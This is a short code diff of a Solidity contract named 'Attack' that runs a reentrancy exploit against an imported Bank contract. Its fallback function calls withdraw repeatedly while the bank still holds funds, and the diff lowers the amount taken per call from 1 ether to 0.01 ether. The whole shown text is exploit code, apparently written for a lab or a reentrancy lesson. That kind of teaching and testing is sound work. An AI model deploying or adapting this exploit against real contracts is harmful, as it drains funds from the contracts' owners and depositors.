@@ -4,20 +4,21 @@ import "./Bank.sol";
 
 contract Attack {
   Bank bank;
+  uint constant target = 0.01 ether;
 
   constructor(Bank _bank) public {
     bank = Bank(_bank);
   }
 
   fallback() external payable {
-    if (address(bank).balance >= 1 ether) {
-      bank.withdraw(1 ether);
+    if (address(bank).balance >= target) {
+      bank.withdraw(target);
     }
   }
 
   function attack() public payable {
-    bank.deposit{value: 1 ether}();
-    bank.withdraw(1 ether);
+    bank.deposit{value: target}();
+    bank.withdraw(target);
   }
 
   function getBalance() public view returns (uint) {
